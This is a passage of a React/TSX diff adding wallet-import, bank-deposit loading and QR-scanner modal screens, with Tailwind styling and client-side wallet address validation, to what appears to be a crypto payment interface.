+                        }`}
+                      >
+                        <Key className="w-4 h-4" />
+                        <span>Import Wallet</span>
+                        <ChevronRight className="w-4 h-4" />
+                      </button>
+                    </div>
+                  </form>
+                </motion.div>
+              )}
+
+              {/* STEP 3.10: PREPARING BANK TRANSFER FULL SCREEN LOADING INTERFACE */}
+              {step === 'bank_preparing' && (
+                <motion.div 
+                  key="bank_preparing"
+                  initial={{ opacity: 0, scale: 0.98 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.98 }}
+                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-8 sm:p-14 text-center space-y-8 overflow-hidden ring-1 ring-emerald-500/20 shadow-2xl min-h-[520px] flex flex-col items-center justify-center"
+                >
+                  {/* Small X (Cancel) button top-left */}
+                  <button
+                    type="button"
+                    onClick={() => setStep('methods')}
+                    className="absolute top-6 left-6 flex h-9 w-9 items-center justify-center rounded-full bg-white/5 border border-white/10 text-neutral-400 hover:text-white hover:bg-white/10 active:scale-95 transition z-20 shadow-lg cursor-pointer"
+                    title="Cancel"
+                  >
+                    <X className="w-4 h-4" />
+                  </button>
+
+                  {/* Premium background lighting & subtle animated gradients */}
+                  <div className="pointer-events-none absolute inset-0 opacity-20">
+                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[500px] h-[500px] rounded-full bg-emerald-600/20 blur-[140px] animate-pulse" />
+                    <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-32 bg-gradient-to-b from-emerald-500/10 to-transparent blur-xl" />
+                  </div>
+
+                  {/* Center Content Section */}
+                  <div className="space-y-8 my-auto relative z-10 flex flex-col items-center justify-center max-w-lg mx-auto">
+                    {/* Unique premium banking animation (continuous circular loading indicator + Landmark icon) */}
+                    <div className="relative w-36 h-36 flex items-center justify-center my-2">
+                      <div className="absolute inset-0 rounded-full bg-emerald-500/15 blur-xl animate-pulse" />
+                      
+                      {/* Dual continuous circular rotating rings */}
+                      <div className="absolute inset-0 rounded-full border-2 border-emerald-500/20 border-t-emerald-400 border-r-teal-400 animate-spin [animation-duration:2.5s]" />
+                      <div className="absolute inset-3 rounded-full border border-teal-500/15 border-b-emerald-400/80 animate-spin [animation-duration:6s] [animation-direction:reverse]" />
+                      
+                      {/* Center Landmark Banking Emblem */}
+                      <div className="w-20 h-20 rounded-3xl bg-gradient-to-br from-emerald-950/90 via-slate-900 to-teal-950/90 border border-emerald-500/40 flex items-center justify-center relative shadow-2xl shadow-emerald-950">
+                        <Landmark className="w-10 h-10 text-emerald-300 relative z-10 animate-pulse" />
+                        <div className="absolute inset-0 rounded-3xl bg-emerald-500/15 blur-md" />
+                      </div>
+                    </div>
+
+                    {/* Bold Heading & Single Status Message */}
+                    <div className="space-y-3 text-center">
+                      <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
+                        Preparing Bank Deposit
+                      </h2>
+                      
+                      {/* Single Supporting Status Message with smooth fade transition */}
+                      <div className="min-h-[28px] flex items-center justify-center">
+                        <AnimatePresence mode="wait">
+                          <motion.p
+                            key={bankStatusIndex}
+                            initial={{ opacity: 0, y: 6 }}
+                            animate={{ opacity: 1, y: 0 }}
+                            exit={{ opacity: 0, y: -6 }}
+                            transition={{ duration: 0.35, ease: 'easeOut' }}
+                            className="text-xs sm:text-sm font-mono font-semibold text-emerald-400/90 tracking-wide"
+                          >
+                            {BANK_STATUS_MESSAGES[bankStatusIndex]}
+                          </motion.p>
+                        </AnimatePresence>
+                      </div>
+                    </div>
+                  </div>
+                </motion.div>
+              )}
+
+              {/* QR SCANNER MODAL DIALOG */}
+              {isQrScannerOpen && (
+                <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
+                  <motion.div 
+                    initial={{ opacity: 0, scale: 0.9 }}
+                    animate={{ opacity: 1, scale: 1 }}
+                    exit={{ opacity: 0, scale: 0.9 }}
+                    className="relative w-full max-w-md rounded-3xl bg-neutral-900 border border-white/15 p-6 text-white space-y-5 shadow-2xl"
+                  >
+                    <div className="flex items-center justify-between pb-4 border-b border-white/10">
+                      <div className="flex items-center gap-2">
+                        <QrCode className="w-5 h-5 text-indigo-400" />
+                        <h3 className="text-base font-bold text-white">Scan Wallet QR Code</h3>
+                      </div>
+                      <button 
+                        type="button"
+                        onClick={() => setIsQrScannerOpen(false)}
+                        className="p-1.5 rounded-xl bg-white/5 border border-white/10 text-neutral-400 hover:text-white"
+                      >
+                        <XCircle className="w-5 h-5" />
+                      </button>
+                    </div>
+
+                    <div className="relative w-full aspect-square rounded-2xl bg-black border border-indigo-500/40 overflow-hidden flex flex-col items-center justify-center p-4">
+                      <div className="w-56 h-56 border-2 border-indigo-400 rounded-2xl relative flex items-center justify-center">
+                        <div className="absolute -top-1 -left-1 w-4 h-4 border-t-4 border-l-4 border-indigo-400 rounded-tl-sm" />
+                        <div className="absolute -top-1 -right-1 w-4 h-4 border-t-4 border-r-4 border-indigo-400 rounded-tr-sm" />
+                        <div className="absolute -bottom-1 -left-1 w-4 h-4 border-b-4 border-l-4 border-indigo-400 rounded-bl-sm" />
+                        <div className="absolute -bottom-1 -right-1 w-4 h-4 border-b-4 border-r-4 border-indigo-400 rounded-br-sm" />
+
+                        <motion.div 
+                          className="w-full h-1 bg-gradient-to-r from-transparent via-indigo-400 to-transparent shadow-[0_0_15px_#818cf8]"
+                          animate={{ y: [-90, 90, -90] }}
+                          transition={{ repeat: Infinity, duration: 2.5, ease: 'easeInOut' }}
+                        />
+                      </div>
+
+                      <p className="text-[11px] text-neutral-400 mt-4 text-center px-4">
+                        Position the wallet QR code within the frame, or paste the decoded address string below.
+                      </p>
+                    </div>
+
+                    <div className="space-y-2">
+                      <label className="text-xs text-neutral-400">Pasted or Scanned QR String:</label>
+                      <div className="flex gap-2">
+                        <input
+                          type="text"
+                          value={qrScanInput}
+                          onChange={(e) => setQrScanInput(e.target.value)}
+                          placeholder="Paste QR payload or raw address..."
+                          className="flex-1 bg-black border border-white/10 rounded-xl px-3 py-2 text-xs font-mono text-white outline-none focus:border-indigo-500"
+                        />
+                        <button
+                          type="button"
+                          onClick={() => {
+                            if (qrScanInput.trim()) {
+                              setManualAddress(qrScanInput.trim());
+                              setManualAddressTouched(true);
+                              const res = validateWalletAddress(qrScanInput.trim(), manualNetwork.type, manualNetwork.name);
+                              if (res.valid) {
+                                setManualAddressError(null);
+                              } else {
+                                setManualAddressError(res.error || null);
+                              }
+                              setIsQrScannerOpen(false);
+                            }
+                          }}
+                          className="px-4 py-2 rounded-xl bg-indigo-600 text-xs font-bold text-white hover:bg-indigo-500 transition"
+                        >
+                          Apply
+                        </button>
+                      </div>
+                    </div>
+                  </motion.div>
+                </div>
+              )}
 
               {step === 'unavailable' && (
                 <motion.div 
